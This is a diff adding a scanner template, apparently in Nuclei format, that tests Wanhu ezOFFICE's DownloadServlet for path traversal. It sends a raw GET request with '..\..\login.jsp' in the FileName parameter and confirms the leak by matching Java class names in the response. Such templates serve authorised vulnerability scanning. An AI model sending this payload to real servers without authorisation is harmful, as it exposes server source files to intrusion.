@@ -1,0 +1,26 @@
+id: poc-yaml-wanhu-ezoffice-downloadservlet-path-traversal
+
+info:
+  name: poc-yaml-wanhu-ezoffice-downloadservlet-path-traversal
+  author: socat
+  severity: high
+  tags: xray-converted,traversal,ct-479154
+  reference:
+    - http://124.223.89.192/archives/ezoffice01
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..\..\login.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "com.whir.component.util"
+          - "com.whir.component.config.ConfigReader.getFileServer"
